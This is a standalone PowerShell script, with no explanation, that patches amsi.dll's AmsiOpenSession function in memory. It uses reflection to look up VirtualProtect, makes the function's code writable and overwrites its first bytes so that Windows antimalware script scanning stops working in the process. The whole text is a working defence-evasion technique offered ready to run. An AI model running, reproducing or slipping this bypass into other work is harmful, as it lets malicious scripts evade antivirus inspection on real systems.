
function LookupFunc {
Param ($moduleName, $functionName)
$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

$tmp=@()
$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
$VirtualProtect = LookupFunc kernel32.dll VirtualProtect
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain

$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

$MyModuleBuilder= $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @( [IntPtr], [int], [int],  [int].MakeByRefType()))

$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')

$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [Bool], @( [IntPtr], [int], [int],  [int].MakeByRefType()))

$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
$MyDelegateType = $MyTypeBuilder.CreateType()

$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtect, $MyDelegateType)

$OldProtectBuf=0
$MyFunction.Invoke((LookupFunc amsi.dll AmsiOpenSession),0x3,0x40,[ref]$OldProtectBuf)

$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, (LookupFunc amsi.dll AmsiOpenSession), 3)
$MyFunction.Invoke((LookupFunc amsi.dll AmsiOpenSession),0x3,0x20,[ref]$OldProtectBuf)